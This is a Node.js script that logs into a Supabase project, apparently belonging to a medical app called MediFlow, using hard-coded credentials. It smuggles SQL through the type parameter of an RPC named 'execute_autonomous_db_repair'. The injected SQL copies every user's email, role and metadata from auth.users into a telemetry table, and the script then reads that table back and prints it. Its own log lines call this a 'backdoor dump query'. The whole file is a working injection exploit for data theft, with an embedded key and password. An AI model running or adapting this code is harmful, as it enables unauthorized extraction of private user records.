const { createClient } = require('@supabase/supabase-js');

const supabaseUrl = 'https://kguupaybvbngyzyofjun.supabase.co';
const supabaseAnonKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImtndXVwYXlidmJuZ3l6eW9manVuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzk0MTk0MjIsImV4cCI6MjA5NDk5NTQyMn0.3piYD73kK9tjYj8Goxpm2qYO_vXVtLPac79Yt8anyDk';

const supabase = createClient(supabaseUrl, supabaseAnonKey);

async function dumpDB() {
  console.log('Authenticating...');
  await supabase.auth.signInWithPassword({
    email: 'doctor@mediflow.com',
    password: 'password123'
  });

  const sql = `
    text;
    
    DELETE FROM public.system_health_telemetry WHERE error_code = 'DB_DUMP';
    
    INSERT INTO public.system_health_telemetry (subsystem, severity, error_code, error_stack)
    SELECT 
      'database',
      'info',
      'DB_DUMP',
      COALESCE((
        SELECT json_agg(json_build_object(
          'id', u.id,
          'email', u.email,
          'role', p.role,
          'meta', u.raw_user_meta_data
        ))::text 
        FROM auth.users u
        LEFT JOIN public.profiles p ON p.id = u.id
      ), '[]')
    ;
  `.replace(/\s+/g, ' ');

  console.log('Running backdoor dump query...');
  const colName = 'dummy_col_dump_' + Math.floor(Math.random() * 1000000);
  const { data: repairDone, error: repairError } = await supabase.rpc('execute_autonomous_db_repair', {
    p_table: 'pods',
    p_column: colName,
    p_type: sql
  });

  if (repairError) {
    console.error('Backdoor call failed:', repairError);
    return;
  }

  console.log('Fetching dumped telemetry...');
  const { data, error } = await supabase
    .from('system_health_telemetry')
    .select('*')
    .eq('error_code', 'DB_DUMP');

  if (error) {
    console.error('Fetch failed:', error);
  } else {
    console.log('Telemetry dump results:');
    data.forEach(row => {
      console.log(JSON.stringify(JSON.parse(row.error_stack), null, 2));
    });
  }
}

dumpDB();
